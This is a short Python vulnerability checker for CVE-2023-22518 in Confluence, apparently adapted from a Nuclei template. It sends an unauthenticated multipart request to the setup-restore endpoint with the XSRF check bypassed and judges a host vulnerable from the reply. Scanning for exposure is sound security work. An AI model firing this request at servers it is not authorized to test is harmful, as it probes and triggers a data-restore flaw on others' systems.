#CVE-2023-22518 Checker
#Tomado como referencia de https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-22518.yaml
#Adaptado por NullSector.co

import requests
import random
import string
import argparse
import urllib3
import sys


def cadena_aleatoria(longitud=10):
    letras = string.ascii_lowercase
    return ''.join(random.choice(letras) for i in range(longitud))

def enviar_solicitud_restauracion(url):
    url = f"{url.rstrip('/')}/json/setup-restore.action"
    cadena_rand = cadena_aleatoria()
    headers = {
        "X-Atlassian-Token": "no-check",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7"
    }
    datos = (
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
        "Content-Disposition: form-data; name=\"buildIndex\"\r\n\r\n"
        "true\r\n"
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
        f"Content-Disposition: form-data; name=\"file\";filename=\"{cadena_rand}.zip\"\r\n\r\n"
        f"{cadena_rand}\r\n"
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7\r\n"
        "Content-Disposition: form-data; name=\"edit\"\r\n\r\n"
        "Subir e importar\r\n"
        "------WebKitFormBoundaryT3yekvo0rGaL9QR7--\r\n"
    )

    try:
        respuesta = requests.post(url, headers=headers, data=datos.encode('utf-8'), verify=False)

        if (respuesta.status_code == 200 and
            'The zip file did not contain an entry' in respuesta.text and 
            'exportDescriptor.properties' in respuesta.text):
            print(f"[+] Vulnerable a CVE-2023-22518 en host {url}!")
        else:
            print(f"[-] No vulnerable a CVE-2023-22518 para el host {url}.")
    except requests.RequestException as e:
        print(f"[*] Error al conectar con {url}. Error: {e}")

def main():

    enviar_solicitud_restauracion(sys.argv[1])

if __name__ == "__main__":
    main()
